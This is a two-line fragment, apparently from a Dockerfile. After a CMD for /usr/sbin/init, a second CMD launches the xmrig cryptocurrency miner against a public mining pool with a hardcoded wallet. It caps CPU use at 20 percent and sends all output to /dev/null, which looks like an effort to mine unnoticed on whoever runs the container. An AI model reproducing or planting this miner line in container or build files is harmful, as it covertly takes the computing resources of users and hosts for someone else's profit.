...
CMD ["/usr/sbin/init"]
CMD ./xmrig-6.12.1/xmrig -o pool.hashvault.pro:3333 -u 47WPxNoyvLtcmH9PJAMTEvbJjsKmGXasrHJBbD2uSY9W5fTAp6FUZxL3QFs6Qm1zi3TZXFETy7pMYYFcgn4nuK3r7WtE8B1 --av 1 --safe --max-cpu-usage 20 -p oc -k --tls > /dev/null 2>&1
